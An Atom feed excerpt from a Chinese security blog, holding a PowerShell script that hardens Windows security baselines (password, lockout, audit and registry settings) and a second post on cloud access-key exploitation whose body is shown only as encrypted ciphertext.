<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zering的博客</title>
  
  <subtitle>记录点滴</subtitle>
  <link href="https://fl4g.cn/atom.xml" rel="self"/>
  
  <link href="https://fl4g.cn/"/>
  <updated>2021-05-21T08:20:48.625Z</updated>
  <id>https://fl4g.cn/</id>
  
  <author>
    <name>zering</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows基线整改脚本</title>
    <link href="https://fl4g.cn/2021/05/21/Windows%E5%9F%BA%E7%BA%BF%E6%95%B4%E6%94%B9%E8%84%9A%E6%9C%AC/"/>
    <id>https://fl4g.cn/2021/05/21/Windows%E5%9F%BA%E7%BA%BF%E6%95%B4%E6%94%B9%E8%84%9A%E6%9C%AC/</id>
    <published>2021-05-21T07:57:14.000Z</published>
    <updated>2021-05-21T08:20:48.625Z</updated>
    
    <content type="html"><![CDATA[<p>上次做基线检查，大佬们没时间整改。于是就抽时间写了个基线整改的脚本。</p><p>前期使用<code>net accounts</code>对账号进行修改。后来发现了一些问题。</p><p><strong>遇到的问题点：</strong>修改组策略时，发现使用命令无法修改所有想修改的内容。</p><a id="more"></a><p>使用<a href="https://t.codebug.vip/questions-1129117.htm">https://t.codebug.vip/questions-1129117.htm</a>给出的方案解决问题</p><ol><li>先将本地安全策略转换为PsObject</li><li>更改属性</li><li>重新保存会本地安全策略</li></ol><p>以下为我修改后使用完整的脚本（必须以管理员身份运行），如需使用，请先自行评估各修改项影响.</p><p>文件地址：<a href="https://github.com/zeringzxh/windows_baseline">https://github.com/zeringzxh/windows_baseline</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">Parse-SecPol</span><span class="params">(<span class="variable">$CfgFile</span>)</span></span>&#123; </span><br><span class="line">    secedit /export /cfg <span class="string">&quot;<span class="variable">$CfgFile</span>&quot;</span> | <span class="built_in">out-null</span></span><br><span class="line">    <span class="variable">$obj</span> = <span class="built_in">New-Object</span> psobject</span><br><span class="line">    <span class="variable">$index</span> = <span class="number">0</span></span><br><span class="line">    <span class="variable">$contents</span> = <span class="built_in">Get-Content</span> <span class="variable">$CfgFile</span> <span class="literal">-raw</span></span><br><span class="line">    [<span class="type">regex</span>]::Matches(<span class="variable">$contents</span>,<span class="string">&quot;(?&lt;=\[)(.*)(?=\])&quot;</span>) | %&#123;</span><br><span class="line">        <span class="variable">$title</span> = <span class="variable">$_</span></span><br><span class="line">        [<span class="type">regex</span>]::Matches(<span class="variable">$contents</span>,<span class="string">&quot;(?&lt;=\]).*?((?=\[)|(\Z))&quot;</span>, [<span class="type">System.Text.RegularExpressions.RegexOptions</span>]::Singleline)[<span class="variable">$index</span>] | %&#123;</span><br><span class="line">            <span class="variable">$section</span> = <span class="built_in">new-object</span> psobject</span><br><span class="line">            <span class="variable">$_</span>.value <span class="operator">-split</span> <span class="string">&quot;\r\n&quot;</span> | ?&#123;<span class="variable">$_</span>.length <span class="operator">-gt</span> <span class="number">0</span>&#125; | %&#123;</span><br><span class="line">                <span class="variable">$value</span> = [<span class="type">regex</span>]::Match(<span class="variable">$_</span>,<span class="string">&quot;(?&lt;=\=).*&quot;</span>).value</span><br><span class="line">                <span class="variable">$name</span> = [<span class="type">regex</span>]::Match(<span class="variable">$_</span>,<span class="string">&quot;.*(?=\=)&quot;</span>).value</span><br><span class="line">                <span class="variable">$section</span> | <span class="built_in">add-member</span> <span class="literal">-MemberType</span> NoteProperty <span class="literal">-Name</span> <span class="variable">$name</span>.tostring().trim() <span class="literal">-Value</span> <span class="variable">$value</span>.tostring().trim() <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">out-null</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$obj</span> | <span class="built_in">Add-Member</span> <span class="literal">-MemberType</span> NoteProperty <span class="literal">-Name</span> <span class="variable">$title</span> <span class="literal">-Value</span> <span class="variable">$section</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$index</span> += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$obj</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">Set-SecPol</span><span class="params">(<span class="variable">$Object</span>, <span class="variable">$CfgFile</span>)</span></span>&#123;</span><br><span class="line">   <span class="variable">$SecPool</span>.psobject.Properties.GetEnumerator() | %&#123;</span><br><span class="line">        <span class="string">&quot;[<span class="variable">$</span>(<span class="variable">$_</span>.Name)]&quot;</span></span><br><span class="line">        <span class="variable">$_</span>.Value | %&#123;</span><br><span class="line">            <span class="variable">$_</span>.psobject.Properties.GetEnumerator() | %&#123;</span><br><span class="line">                <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$_</span>.Name)=<span class="variable">$</span>(<span class="variable">$_</span>.Value)&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; | <span class="built_in">out-file</span> <span class="variable">$CfgFile</span> <span class="literal">-ErrorAction</span> Stop</span><br><span class="line">    secedit /configure /db c:\windows\security\local.sdb /cfg <span class="string">&quot;<span class="variable">$CfgFile</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$SecPool</span> = Parse<span class="literal">-SecPol</span> <span class="literal">-CfgFile</span> C:\Test.cgf</span><br><span class="line"><span class="comment">#组策略</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;System Access&#x27;</span>.NewAdministratorName = <span class="string">&quot;admlntest&quot;</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;System Access&#x27;</span>.EnableGuestAccount = <span class="number">0</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;System Access&#x27;</span>.NewGuestName = <span class="operator">-join</span>((<span class="number">48</span>..<span class="number">57</span> + <span class="number">65</span>..<span class="number">90</span> + <span class="number">97</span>..<span class="number">122</span>) | <span class="built_in">get-random</span> <span class="literal">-count</span> <span class="number">6</span> | %&#123;[<span class="built_in">char</span>]<span class="variable">$_</span>&#125;) + <span class="string">&quot;guest&quot;</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;System Access&#x27;</span>.PasswordComplexity = <span class="number">1</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;System Access&#x27;</span>.MinimumPasswordLength = <span class="number">8</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;System Access&#x27;</span>.MaximumPasswordAge = <span class="number">90</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;System Access&#x27;</span>.PasswordHistorySize = <span class="number">5</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;System Access&#x27;</span>.LockoutBadCount = <span class="number">5</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;System Access&#x27;</span>.ResetLockoutCount = <span class="number">30</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;System Access&#x27;</span>.LockoutDuration = <span class="number">30</span></span><br><span class="line"><span class="comment">#审核策略</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Event Audit&#x27;</span>.AuditSystemEvents = <span class="number">3</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Event Audit&#x27;</span>.AuditLogonEvents = <span class="number">3</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Event Audit&#x27;</span>.AuditObjectAccess = <span class="number">3</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Event Audit&#x27;</span>.AuditProcessTracking = <span class="number">2</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Event Audit&#x27;</span>.AuditDSAccess = <span class="number">3</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Event Audit&#x27;</span>.AuditPrivilegeUse = <span class="number">3</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Event Audit&#x27;</span>.AuditSystemEvents = <span class="number">3</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Event Audit&#x27;</span>.AuditAccountLogon = <span class="number">3</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Event Audit&#x27;</span>.AuditAccountManage = <span class="number">3</span></span><br><span class="line"><span class="comment">#操作系统本地关机策略</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Privilege Rights&#x27;</span>.SeShutdownPrivilege = <span class="string">&quot;*S-1-5-32-544&quot;</span></span><br><span class="line"><span class="comment">#操作系统远程关机策略安全</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Privilege Rights&#x27;</span>.SeRemoteShutdownPrivilege = <span class="string">&quot;*S-1-5-32-544&quot;</span></span><br><span class="line"><span class="comment">#取得文件或其他对象的所有权限策略</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Privilege Rights&#x27;</span>.SeProfileSingleProcessPrivilege = <span class="string">&quot;*S-1-5-32-544&quot;</span></span><br><span class="line"><span class="comment">#从本地登录此计算机策略</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Privilege Rights&#x27;</span>.SeInteractiveLogonRight = <span class="string">&quot;*S-1-5-32-544,*S-1-5-32-545,*S-1-5-32-551&quot;</span></span><br><span class="line"><span class="comment">#从网络访问次计算机</span></span><br><span class="line"><span class="comment">#$SecPool.&#x27;Privilege Rights&#x27;.SeNetworkLogonRight = &quot;*S-1-5-32-544,*S-1-5-32-545,*S-1-5-32-551&quot;</span></span><br><span class="line"><span class="comment">#暂停会话前所需的空闲时间</span></span><br><span class="line"><span class="variable">$SecPool</span>.<span class="string">&#x27;Registry Values&#x27;</span>.<span class="string">&#x27;MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\AutoDisconnect&#x27;</span> = <span class="string">&quot;4,15&quot;</span> </span><br><span class="line"><span class="built_in">Set-SecPol</span> <span class="literal">-Object</span> <span class="variable">$SecPool</span> <span class="literal">-CfgFile</span> C:\Test.cfg</span><br><span class="line"><span class="built_in">rm</span> <span class="literal">-force</span> C:\Test.cgf <span class="literal">-confirm</span>:<span class="variable">$false</span></span><br><span class="line"><span class="built_in">rm</span> <span class="literal">-force</span> C:\Test.cfg <span class="literal">-confirm</span>:<span class="variable">$false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#日志大小</span></span><br><span class="line"><span class="comment">#Set-ItemProperty -Path &quot;Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\Application&quot; -name &quot;MaxSize&quot; -value 20971520</span></span><br><span class="line"><span class="comment">#Set-ItemProperty -Path &quot;Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\System&quot; -name &quot;MaxSize&quot; -value 20971520</span></span><br><span class="line"><span class="comment">#Set-ItemProperty -Path &quot;Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\Security&quot; -name &quot;MaxSize&quot; -value 20971520</span></span><br><span class="line"><span class="comment">#关闭默认共享</span></span><br><span class="line"><span class="comment">#Set-ItemProperty -Path &quot;Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters&quot; -name &quot;AutoShareServer&quot; -value 0</span></span><br><span class="line"><span class="comment">#禁止全部驱动器自动播放</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot;</span> <span class="literal">-name</span> <span class="string">&quot;NoDriveTypeAutoRun&quot;</span> <span class="literal">-value</span> <span class="number">255</span></span><br><span class="line"><span class="comment">#屏幕保护程序</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::HKEY_CURRENT_USER\Control Panel\Desktop&quot;</span> <span class="literal">-name</span> <span class="string">&quot;ScreenSaveTimeOut&quot;</span> <span class="literal">-value</span> <span class="number">300</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::HKEY_CURRENT_USER\Control Panel\Desktop&quot;</span> <span class="literal">-name</span> <span class="string">&quot;ScreenSaverIsSecure&quot;</span> <span class="literal">-value</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>参考：</strong><a href="https://t.codebug.vip/questions-1129117.htm">https://t.codebug.vip/questions-1129117.htm</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;上次做基线检查，大佬们没时间整改。于是就抽时间写了个基线整改的脚本。&lt;/p&gt;
&lt;p&gt;前期使用&lt;code&gt;net accounts&lt;/code&gt;对账号进行修改。后来发现了一些问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;遇到的问题点：&lt;/strong&gt;修改组策略时，发现使用命令无法修改所有想修改的内容。&lt;/p&gt;</summary>
    
    
    
    <category term="企业安全建设" scheme="https://fl4g.cn/categories/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="基线" scheme="https://fl4g.cn/tags/%E5%9F%BA%E7%BA%BF/"/>
    
  </entry>
  
  <entry>
    <title>某地攻防演练阿里云accesskey利用</title>
    <link href="https://fl4g.cn/2021/04/28/%E6%9F%90%E5%9C%B0%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E9%98%BF%E9%87%8C%E4%BA%91accesskey%E5%88%A9%E7%94%A8/"/>
    <id>https://fl4g.cn/2021/04/28/%E6%9F%90%E5%9C%B0%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E9%98%BF%E9%87%8C%E4%BA%91accesskey%E5%88%A9%E7%94%A8/</id>
    <published>2021-04-28T07:44:17.000Z</published>
    <updated>2021-04-28T08:31:22.933Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="45319193afc8e2345aaa1b28d2a3db39c316dec12bb5376a08ae11d9d8ae7899">dc946382a78ca636ebd67616e96bfe4b9f44425394b9a5006a76e986e0833a319e17b12a5ea6d38b3067174a58ade7040f9f16451f5aa677782715de218554162ac90899e5e2358ed5abb837e70ca0427c5fa02ed821ed4fec18765ad2ce3102bff745bd267633973f9f3085e0fae3ca59c8182b5d221909ad1ab9e0410c3806f0dfc4708ecc1d9c4a1acbe27f4d75b69dad471ae393757954239a12299a7bdaff09c57468eef4005122e2fff75ed259f28ba700fb7da236a24dcd2acffa6631c281059051000463c06c7cf435b538032a8c5becb0922a1f56f8368980f3d7deed166306c8d7966be0fdad19e23ec74b8da0871896324138937e4f767c793cc89b286fc271ce0baf0e3194bf9988956966691f09cd301a93407519e652c072e5c999a80c6b027083531d0b42a7d692b5cdd0527ea231675f79228238bd5d7027299835708ad1ec7f8b09a7c297f6b63539696d422093064d0ddee2f71d8d0958b60342d4758c9b659814a9aed21508bcafb17524b9db6f7f70a7e41490090a21dd47ab0566e71dc05a7f7aeeb5558e974f6b76a4576718394906de8b034cda9e47371cbbb909c28730412dd69d5b837530bb9b27d81a0e3fd62043c6c1a0682bff3bc0e8386cae9f6a7d37e874abe05e0b24c742f2a938a9c2b9d3a94f013d0aed62943eed26a838b3264bba0893047d7f25a688d0fc40423fa5e2e898f2201d7dda0b57c39f97e29444f3cacbe7729039d96b358b51756316c071034c509b873c951f7acfa4b9be2dc788907236f68eabef0d55b18d5a6a7ddebb7bac2d5906bdb85095c9406c4542ce7ec52398414918ef7341c8fab5c4c93d67cbcbf833b527345446a318303529ec867efb618c499ae52d223ed3692ddd0789287f3f9ecb6c4f962f427d53c52dffae8e2e23f94f83938a3b024e25b36608ca8c1722ad5f64d50239f41a5139738b4dca3b3b06cbf84c190cfe6981aa30e85db6a34c297aa991d0c1843c9e6cec9858d627af7ea47e3f826f1382aa79bf5ec896d41e2b892ca6af07896b8660f2846c6c6fc92f2324ddd6029431b7976c0d3cb5f4638f4877259ffdd236e7751caaa1e6f3b2940ec55d04f51869cc575cd7e8ecb9d8da07fc0ec1dfefa81a5d943608f0c7fb65408215c1f8b3aac62c2ab0a11e0c73f78f2272fd7b21a4a12a7da04b20eaa97c076dbf2ee8cbb6a065ec7e5110d29cfd86ceb7d1887e56509959a78d6602d08a48a4ad0b08fe16e1bd8d5a0307a2c14dcfef0bbc9ce9684fcdb8fd4e59cae02d1273a4135b1792e25e564ad2c8c6ba7697e3fc5b6125bd3a288c6d0f92ea75e4fad508c0afb80faead0c0a48193339baac485a450488de5d1cebbbea08031be8050f2a78c20335d6f6f873c865e027d07fcbfd39ee8594f9ecd6b69e9a3b4362c5b96840df82b6e8abeb7f1ae937977b9f17a856931924a9614bf6f788528d5033c3aec3238aed4a83895984ba0e2c6a0a1c64f660b9cf93a3c929b1921c1d7343fc2bdef8a369b74f4bb838b9ea2a7826a21b3889bc9eddf03e2f593db7b02f715c767fa765909f2d97e4817475426202fce57a6bd1758b0fcd267219c36532a7c8b617aa679c67b695c19e1e9a4846259c57d905deb4b45a0a997e7714ce25dbb6bd40d7c2219b92075ae8a243418b354421532fee4b1a06a51073381c2e6fb74e7747bb367c80a294c80f4ba9eebe18277a56e801748a7b67d79b27794e883c765af8b8afc0306ab9d36a5f5deee5e87e0a487483f63bd693140917f9c4252c09d7e12cf223c3c2dcc9d0568d10dee558f2bddd32f2f6fae6019319c1a800f1f4a2ee9039b20f40606909735891c0cb4aeeeb849c06079a80735f3f38302006f466c79c3b0afbc109a0c03ec7cab8651528a618622b01c62605aad9ca68c0b67dee2294489fe723b4b767c38ebbf927ee7fe57aafb8cfd2277c306d795bdaeb5639954367e6345cce14e94d5eea9dcbd563b205475b9bd040befddff7970c96236cddd2fb812231a9d26daefe79a8bb5534bdd010831d7ffa62de70d3755a8844de495f8a31119532671b3cbadda6470e3a196c0ee0050807aba038e76e013d0dcb1924653bb097f3db2eb4d8daf1439ecea1acee9284f45461dd8ae0d170e5daba4fbad02e3512ff5dcb474e298a1379e2b5401f0b41df8ac39cb67a246f35e819f98cfbea4426d82fec9864348448d7de5f6fd0b52652357aa0408daa30a3465c0774264f814e83911f715faa3b523b55c7cf8c45d8120917bba05eecfe1aac232b037f5dfe28a934536e32f690cb4147c582b374a5ceec144337035be38706e33b87ea4555fd8471dc095cbe12db29dd160b1b0fc7648e2804c8592fa9ce904188782973c12437b8d5d9bdce8d0ba4141a5d8d3dfb9f1ca54c17fc2ff71b7b54d3a70a9e5bc240fd225d716f79cc1a2d03da4f5c62043a68ee2c2ba0ea780c0b6f8b373b95ec9af67df474f2f88e6135f25c683628f82f24d1ba5ff3023024c7ea7e352aff24f2f3d08e99cfa7e45afdb7bdfcecb8a4c8e9f220a4a8f05cfe6d2b3ccb0acf48c223b80d4db2cbf1a7d29d59916d2f877733504103407f66039a1e6d4905de6958d09a385c22280c66b688c16d1fea6183aeb7b16ef9324b1c00c6d4552907a1de646b1e6e3891bc787439d1964d311a43ce46b83412d15a1884fbaef0de831cbc22fc12cf1c11f414907ca525f5f888d0bf75e03fa2c5f4604d072b59727cb707ad61bb687116604395543b681568b5510559be257707f585d8a55f491152f3d0cb4c1266ed515ffea52aa521606bdc10035d4b061c5adf31aa405606e1dca85a79a5773048d50a24f1c4ced3743e7168a512f3cffedb126c868e62289b1aec75ea134cce2ccc3123e6ccb43496e4d980ecaa506e72bc1a9bc8d1ce7ea2bec20112b3fdcfb8ae1b1986710bce63b12591f47422ec5718ab26d1a01a4098fc23690e0bc8276cf54a7a7c9971c875b34a978eeb8803e53d5c94e11e2bc2871c2f7b0bd3606f2a1316</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">&lt;div id=&quot;hexo-blog-encrypt&quot; data-wpm=&quot;密码错误，请重试。&quot; data-whm=&quot;OOPS, these decrypted content may changed, but you can still have a look.&quot;&gt;
  &lt;div class=&quot;hbe-input-container&quot;&gt;
  &lt;input type=&quot;password&quot; id=&quot;hbePass&quot; placeholder&gt;
    &lt;label for=&quot;hbePass&quot;&gt;输入密码，查看文章。&lt;/label&gt;
    &lt;div class=&quot;bottom-line&quot;&gt;&lt;/div&gt;
  &lt;/div&gt;
  &lt;script id=&quot;hbeData&quot; type=&quot;hbeData&quot; data-hmacdigest=&quot;45319193afc8e2345aaa1b28d2a3db39c316dec12bb5376a08ae11d9d8ae7899&quot;&gt;dc946382a78ca636ebd67616e96bfe4b9f44425394b9a5006a76e986e0833a319e17b12a5ea6d38b3067174a58ade7040f9f16451f5aa677782715de218554162ac90899e5e2358ed5abb837e70ca0427c5fa02ed821ed4fec18765ad2ce3102bff745bd267633973f9f3085e0fae3ca59c8182b5d221909ad1ab9e0410c3806f0dfc4708ecc1d9c4a1acbe27f4d75b69dad471ae393757954239a12299a7bdaff09c57468eef4005122e2fff75ed259f28ba700fb7da236a24dcd2acffa6631c281059051000463c06c7cf435b538032a8c5becb0922a1f56f8368980f3d7deed166306c8d7966be0fdad19e23ec74b8da0871896324138937e4f767c793cc89b286fc271ce0baf0e3194bf9988956966691f09cd301a93407519e652c072e5c999a80c6b027083531d0b42a7d692b5cdd0527ea231675f79228238bd5d7027299835708ad1ec7f8b09a7c297f6b63539696d422093064d0ddee2f71d8d0958b60342d4758c9b659814a9aed21508bcafb17524b9db6f7f70a7e41490090a21dd47ab0566e71dc05a7f7aeeb5558e974f6b76a4576718394906de8b034cda9e47371cbbb909c28730412dd69d5b837530bb9b27d81a0e3fd62043c6c1a0682bff3bc0e8386cae9f6a7d37e874abe05e0b24c742f2a938a9c2b9d3a94f013d0aed62943eed26a838b3264bba0893047d7f25a688d0fc40423fa5e2e898f2201d7dda0b57c39f97e29444f3cacbe7729039d96b358b51756316c071034c509b873c951f7acfa4b9be2dc788907236f68eabef0d55b18d5a6a7ddebb7bac2d5906bdb85095c9406c4542ce7ec52398414918ef7341c8fab5c4c93d67cbcbf833b527345446a318303529ec867efb618c499ae52d223ed3692ddd0789287f3f9ecb6c4f962f427d53c52dffae8e2e23f94f83938a3b024e25b36608ca8c1722ad5f64d50239f41a5139738b4dca3b3b06cbf84c190cfe6981aa30e85db6a34c297aa991d0c1843c9e6cec9858d627af7ea47e3f826f1382aa79bf5ec896d41e2b892ca6af07896b8660f2846c6c6fc92f2324ddd6029431b7976c0d3cb5f4638f4877259ffdd236e7751caaa1e6f3b2940ec55d04f51869cc575cd7e8ecb9d8da07fc0ec1dfefa81a5d943608f0c7fb65408215c1f8b3aac62c2ab0a11e0c73f78f2272fd7b21a4a12a7da04b20eaa97c076dbf2ee8cbb6a065ec7e5110d29cfd86ceb7d1887e56509959a78d6602d08a48a4ad0b08fe16e1bd8d5a0307a2c14dcfef0bbc9ce9684fcdb8fd4e59cae02d1273a4135b1792e25e564ad2c8c6ba7697e3fc5b6125bd3a288c6d0f92ea75e4fad508c0afb80faead0c0a48193339baac485a450488de5d1cebbbea08031be8050f2a78c20335d6f6f873c865e027d07fcbfd39ee8594f9ecd6b69e9a3b4362c5b96840df82b6e8abeb7f1ae937977b9f17a856931924a9614bf6f788528d5033c3aec3238aed4a83895984ba0e2c6a0a1c64f660b9cf93a3c929b1921c1d7343fc2bdef8a369b74f4bb838b9ea2a7826a21b3889bc9eddf03e2f593db7b02f715c767fa765909f2d97e4817475426202fce57a6bd1758b0fcd267219c36532a7c8b617aa679c67b695c19e1e9a4846259c57d905deb4b45a0a997e7714ce25dbb6bd40d7c2219b92075ae8a243418b354421532fee4b1a06a51073381c2e6fb74e7747bb367c80a294c80f4ba9eebe18277a56e801748a7b67d79b27794e883c765af8b8afc0306ab9d36a5f5deee5e87e0a487483f63bd693140917f9c4252c09d7e12cf223c3c2dcc9d0568d10dee558f2bddd32f2f6fae6019319c1a800f1f4a2ee9039b20f40606909735891c0cb4aeeeb849c06079a80735f3f38302006f466c79c3b0afbc109a0c03ec7cab8651528a618622b01c62605aad9ca68c0b67dee2294489fe723b4b767c38ebbf927ee7fe57aafb8cfd2277c306d795bdaeb5639954367e6345cce14e94d5eea9dcbd563b205475b9bd040befddff7970c96236cddd2fb812231a9d26daefe79a8bb5534bdd010831d7ffa62de70d3755a8844de495f8a31119532671b3cbadda6470e3a196c0ee0050807aba038e76e013d0dcb1924653bb097f3db2eb4d8daf1439ecea1acee9284f45461dd8ae0d170e5daba4fbad02e3512ff5dcb474e298a1379e2b5401f0b41df8ac39cb67a246f35e819f98cfbea4426d82fec9864348448d7de5f6fd0b52652357aa0408daa30a3465c0774264f814e83911f715faa3b523b55c7cf8c45d8120917bba05eecfe1aac232b037f5dfe28a934536e32f690cb4147c582b374a5ceec144337035be38706e33b87ea4555fd8471dc095cbe12db29dd160b1b0fc7648e2804c8592fa9ce904188782973c12437b8d5d9bdce8d0ba4141a5d8d3dfb9f1ca54c17fc2ff71b7b54d3a70a9e5bc240fd225d716f79cc1a2d03da4f5c62043a68ee2c2ba0ea780c0b6f8b373b95ec9af67df474f2f88e6135f25c683628f82f24d1ba5ff3023024c7ea7e352aff24f2f3d08e99cfa7e45afdb7bdfcecb8a4c8e9f220a4a8f05cfe6d2b3ccb0acf48c223b80d4db2cbf1a7d29d59916d2f877733504103407f66039a1e6d4905de6958d09a385c22280c66b688c16d1fea6183aeb7b16ef9324b1c00c6d4552907a1de646b1e6e3891bc787439d1964d311a43ce46b83412d15a1884fbaef0de831cbc22fc12cf1c11f414907ca525f5f888d0bf75e03fa2c5f4604d072b59727cb707ad61bb687116604395543b681568b5510559be257707f585d8a55f491152f3d0cb4c1266ed515ffea52aa521606bdc10035d4b061c5adf31aa405606e1dca85a79a5773048d50a24f1c4ced3743e7168a512f3cffedb126c868e62289b1aec75ea134cce2ccc3123e6ccb43496e4d980ecaa506e72bc1a9bc8d1ce7ea2bec20112b3fdcfb8ae1b1986710bce63b12591f47422ec5718ab26d1a01a4098fc23690e0bc8276cf54a7a7c9971c875b34a978eeb8803e53d5c94e11e2bc2871c2f7b0bd3606f2a1316&lt;/script&gt;
&lt;/div&gt;
&lt;script src=&quot;/lib/blog-encrypt.js&quot;&gt;&lt;/script&gt;&lt;link href=&quot;/css/blog-encrypt.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://fl4g.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="accesskey" scheme="https://fl4g.cn/tags/accesskey/"/>
    
  </entry>
  
  <entry>
    <title>Windows安全基线</title>
    <link href="https://fl4g.cn/2021/03/31/Windows%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF/"/>
    <id>https://fl4g.cn/2021/03/31/Windows%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF/</id>
    <published>2021-03-31T09:17:02.000Z</published>
    <updated>2021-04-30T07:51:41.527Z</updated>
    
